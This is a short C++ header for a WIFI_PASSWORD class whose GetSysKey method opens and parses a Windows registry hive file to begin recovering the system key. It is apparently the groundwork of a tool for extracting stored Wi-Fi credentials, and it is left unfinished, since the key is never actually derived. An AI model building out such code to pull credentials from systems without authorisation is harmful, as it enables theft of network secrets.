#pragma once
#include "HIVE.h"

#define SYSKEY_LENGTH  16


class WIFI_PASSWORD {

public:
	/* Get system key from Register */
	BOOL GetSysKey(LPCWSTR lpFileName) {
		BOOL status = FALSE;
		P_HIVE_HANDLE h_Security = NULL;
		HKEY hCurrentControlSet;

		HANDLE hfile = CreateFileW(lpFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
		if (hfile == INVALID_HANDLE_VALUE) {
			return FALSE;
		}
		
		do {
			status = OpenRegistry(hfile, &h_Security);
			if (status == FALSE) {
				break;
			}
			status = GetCurrentControlSet(h_Security, &hCurrentControlSet);
			if (status == FALSE) {
				break;
			}


		}while(FALSE);
		
		CloseHandle(hfile);
		return status;
	}

	WIFI_PASSWORD() {
		memset(sysKey, 0, SYSKEY_LENGTH);
	}

	~WIFI_PASSWORD() = default;

private:
	BYTE sysKey[SYSKEY_LENGTH];
};
